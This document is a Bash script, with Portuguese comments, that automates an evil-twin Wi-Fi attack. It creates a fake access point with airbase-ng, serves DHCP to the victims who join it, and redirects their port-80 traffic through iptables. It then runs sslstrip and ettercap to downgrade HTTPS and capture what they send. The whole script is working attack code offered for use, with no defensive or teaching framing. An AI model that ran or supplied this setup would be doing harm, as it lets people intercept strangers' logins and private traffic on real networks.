#!/bin/bash

# contributors: cr0d, mel, kd 

#funcao para ativar o ipforward e matar os processos do dhcp airbase e etc
killing(){
    killall -9 isc-dhcp-server dhcp airbase-ng xterm tail &>/dev/null
    airmon-ng stop wlan0mon &>/dev/null
    service isc-dhcp-server stop &>/dev/null
    
}

#funcao para dar flush nas regras iptables
reset_iptables(){
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
}

#funcao para ler o nome das interfaces que serao usadas para criar o fake rogue xqdl
setup_interfaces(){
    echo "[INFO] Your interfaces: "
    ifconfig -a | grep -E "(^[a-z])" | sed 's/:.*$//;/^lo.*$/d'
    echo ""
    echo "[!] Enter the interface connected to the internet: "
    read INTERNET_IFACE

    echo "Enter the interface used to create the hotspot: "
    echo "[TIP] try:  wlan0, wlp2s0, etc ..."
    read HOTSPOT_IFACE

    #echo "Enter the interface used to monitor: "
    #echo "[TIP] try: wlan0mon, wlp2s0mon, etc ..."
    #read MONITOR_IFACE
    MONITOR_IFACE="wlan0mon"
    
    echo "[INFO] Your gateway: "
    GATEWAYIP=`route -n | awk '{print $2}' | grep -v 0.0.0.0 | grep -v IP | grep -v Gateway`
    echo "$GATEWAYIP"

    echo "[!] Enter the name of your Fake Access Point: "
    read FAKE_AP_NAME

    #echo "Enter the channel for yout hotspot: "
    #echo "[TIP] try: a number between 1 and 11 "
    #read CHANNEL
}

build_ap(){
    airmon-ng start $HOTSPOT_IFACE &>/dev/null
    xterm -hold -e airbase-ng -c 11 -e $FAKE_AP_NAME $MONITOR_IFACE &
    sleep 30
}

config_at0(){ #configurar a intranet interface
    ifconfig at0 192.168.1.1 netmask 255.255.255.0 &>/dev/null
    ifconfig at0 mtu 1400 &>/dev/null
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 &>/dev/null
}

setup_iptables(){
    echo 1 > /proc/sys/net/ipv4/ip_forward
   
    iptables -t nat -A PREROUTING -p udp -j DNAT --to "$GATEWAYIP"
    iptables -P FORWARD ACCEPT
    iptables --append FORWARD --in-interface at0 -j ACCEPT
    iptables --table nat --append POSTROUTING --out-interface "$INTERNET_IFACE" -j MASQUERADE
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
}

setup_dhcp(){
sed 's/^//' <<CHAR_EOF > /etc/dhcp/dhcpd.conf
authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name "unipampa";
option domain-name-servers 8.8.8.8, 8.8.4.4;
range 192.168.1.2 192.168.1.25;
}
CHAR_EOF
echo "INTERFACES=at0;" >> /etc/dhcp/dhcpd.conf

}
restart_interfaces(){
    airmon-ng stop "$MONITOR_IFACE" &>/dev/null
    airmon-ng stop "$HOTSPOT_IFACE" &>/dev/null
    ifconfig "$HOTSPOT_IFACE" down &>/dev/null
    airmon-ng start "$HOTSPOT_IFACE" &>/dev/null
    ifconfig "$MONITOR_IFACE" down &>/dev/null
}

start_dhcp(){
    #dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
    service isc-dhcp-server start &>/dev/null
}

###################### MAIN FUNCTION #############################
if [ "$EUID" -ne 0 ]
then 
    echo "[WARNING] Script need to be run by root."
    echo "[TIP] try: sudo bash $0"
    exit
fi

for CMD in route xterm airmon-ng pkill dhcpd python aircrack-ng ettercap sslstrip

do
    if [ ! `which $CMD` ]
    then
        echo "[ERROR] Missing command/app \"$CMD\". Install it first."
		echo "[TIP] try: sudo apt install $CMD -y"
        exit
    fi
done

echo -n "[INFO] Activating IP Forwarding and killing old fake AP processes if they exist... "
killing 
echo "Done"

echo -n "[INFO] Flushing iptables rules... "
reset_iptables
echo "Done"

echo -n "[INFO] setuping dchp... "
setup_dhcp
echo "Done"

setup_interfaces

echo -n "[INFO] restarting interfaces... "
restart_interfaces
echo "Done"

echo -n "[INFO] building "$FAKE_AP_NAME"... "
build_ap
sleep 5
echo "Done"
    
echo -n "[INFO] Configuring the intranet interface... "
config_at0
echo "Done"

echo -n "[INFO] Starting dhcp... "
start_dhcp
echo "Done"

echo -n "[INFO] Setting up iptables rules... "
setup_iptables
echo "Done"

echo -n "[INFO] Ataaack... "
sleep 3
xterm -hold -e sslstrip -f -p -k 10000 &
sleep 3
xterm -hold -e ettercap -p -u -T -q -i at0 &

#echo -n "[INFO] Rebuilding your wifi conection..."
#reset_network
#echo "Done"

echo ""
echo "Cya"
